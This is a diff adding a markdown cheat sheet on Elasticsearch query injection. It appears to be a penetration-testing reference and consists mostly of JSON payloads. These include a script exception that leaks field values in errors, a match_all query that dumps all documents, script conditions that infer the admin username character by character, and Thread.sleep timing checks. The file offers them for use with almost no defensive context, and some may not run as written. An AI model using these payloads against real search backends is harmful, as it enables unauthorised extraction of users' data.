@@ -1,0 +1,34 @@
+# Elasticsearch
+
+Elasticsearch uses JSON queries, so injection involves manipulating query objects to extract or filter data.
+
+## Error-based
+Inject invalid scripts to error with data.
+
+If scripting: {"script_score": {"script": "throw new Exception('version: ' + params._source.version)"}} to leak in error.
+
+## Union-like
+Use match_all to retrieve all documents.
+
+{"query": {"match_all": {}}} to get all data as proof.
+
+## Boolean-based blind
+Use script queries for conditions.
+
+For username field == 'admin':
+{"query": {"script": {"script": "doc['username'].value == 'admin'"}}}
+
+For length >16:
+{"query": {"script": {"script": "doc['username'].value.length() >16"}}}
+
+Binary search as above.
+
+For chars: doc['username'].value.charAt(0) == 'a' or > codes.
+
+## Time-based blind
+If scripting: Thread.sleep(5000) if condition.
+
+{"query": {"script_score": {"script": "if (doc['username'].value.charAt(0)=='a') Thread.sleep(5000)"}}}
+
+Adapt for binary search on length and chars.
+
